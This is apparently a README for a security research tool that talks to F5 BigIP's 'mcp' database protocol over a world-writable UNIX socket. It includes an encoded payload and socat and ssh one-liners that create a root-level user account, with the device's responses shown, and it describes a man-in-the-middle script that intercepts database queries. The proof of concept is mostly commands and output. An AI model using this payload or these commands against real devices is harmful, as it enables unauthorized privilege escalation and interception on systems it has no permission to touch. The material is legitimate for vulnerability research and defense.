This isn't really done or ready yet, but I wanted to get the code checked in.

This basically implements F5's database protocol, "mcp", which operates through
a UNIX domain socket.

# What is mcp?

MCP is a proprietary (AFAICT) database used by F5 BigIP. It's accessed through
`/var/run/mcp`, a UNIX domain socket with 0777 permissions (ie, any user can
access it).

The protocol is TLV-style, which a whole bunch of types (over 41,000). They're
all listed in [mcp-objects.txt](/mcp-objects.txt).

I implemented a parser that you can find in [mcp-parser.rb](/mcp-parser.rb),
and you can find a bunch of different messages in
[mcp-parser-tests.rb](/mcp-parser-tests.rb).

I also created a builder, [mcp-builder.rb](/mcp-builder.rb), although it's not
really designed to be easy to use. We do have a pre-defined function that
creates an MCP packet that creates a root-level user account, which is pretty
cool.

# Building and Sending MCP Messages

To communicate with MCP directly, you'll generally use `socat`. For example,
we can use `mcp-builder.rb` to create a message (using `gzip` + `base64` for
easier demos):

```
$ ruby mcp-builder.rb | gzip - | base64 -w0
H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxQ5KPA8gYCLGBaQ4ANbBwnA3tRfl5JanGJADtEowAHzJ5ox5ycWCDzBBZzDnALgukd3EJo5sifBAtwMLA55+fm5ucJxkPM5ZYEi3MzcOonZebpJyUWZ3CLgKUYuYXBUjkMWSpmKkVJJWZ5ocFB7s5VnlX5PhEqRUZ5vhk5RqY+5iZ5pUYm2aVJjvlVJYXBbklpiSlJZWaFeSmeeqa5roVRufph+oX6JXluejlB7pWpTnlZAcVFju4V5gbOKWnFZa76pZXhSb5uBYUFJfpgJyL7Kw/sHwYAd5yKZH8BAAA=
```

Then, on the host with `/var/run/mcp`, use socat to connect and save the
response again as base64 (note: this can be any user account, since the socket
is 0777):

```
# echo -ne 'H4[...]A=' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | base64 -w0
AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=
```

And finally, we can parse that response:

```
$ echo -ne 'AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=' | base64 -d | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = create
 result_type (tag) = userdb_entry
```

You can, of course, do it all as a single command:

```
$ ruby mcp-builder.rb | ssh root@10.0.0.136 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb 
result (structure [22 bytes]):
 result_code (ulong) = 0x00000000 (0)
 result_operation (tag) = user_authenticated
 result_type (tag) = user_authenticated_name
result (structure [96 bytes]):
 result_code (ulong) = 0x01020066 (16908390)
 result_message (string [78 bytes]) = "01020066:3: The requested user (rontest) already exists in partition Common."
```

# Man in the Middle Inspection

I also wrote a tool to inspect database queries - [mcp-mitm.rb](/mcp-mitm.rb).
To run it, edit the script to set up the variables:

```
ME = "10.0.0.146"
TARGET = "10.0.0.136"
PORT1 = 1234
PORT2 = 1235
DO_SETUP = true
```

If `DO_SETUP` is `true`, make sure you can `ssh root@<TARGET>` without a
password. Otherwise, it'll tell you which commands to run.

Note that this tries to clean up, but can potentially destabilize the server
(because we're moving a named pipe). Don't run against prod. And if you do
break the server, rebooting will fix it.

Once it's configured, just run it:

```
$ ruby ./mcp-mitm.rb
Configuration (edit the script to change, this is a PoC!):

Your IP: 10.0.0.146
Target IP: 10.0.0.136
Listening port 1: 1234
Listening port 2: 1235
SSH into the target to set things up: true
  (Make sure you can ssh into the host as root with no password)
  (Yes yes, I know it's a PoC!)
SSH'ing into the server to set things up
Ready!


---------------------------------------------------

Received session @ #<TCPSocket:0x000000000170d630> <--> #<TCPSocket:0x000000000170d658>

user_authenticated (structure [15 bytes]):
 user_authenticated_name (string [7 bytes]) = "admin"

start_transaction (structure [8 bytes]):
 start_transaction_load_type (ulong) = 0x00000000 (0)
[...]
```

Ctrl-c will stop it, and fix the socket:

```
^CSSH'ing into the server to fix things
Session 1 closed?
Ending thread
Ending thread
Traceback (most recent call last):
        3: from ./mcp-mitm.rb:149:in `<main>'
        2: from ./mcp-mitm.rb:149:in `loop'
        1: from ./mcp-mitm.rb:151:in `block in <main>'
./mcp-mitm.rb:151:in `accept': Interrupt
```

And that's it!
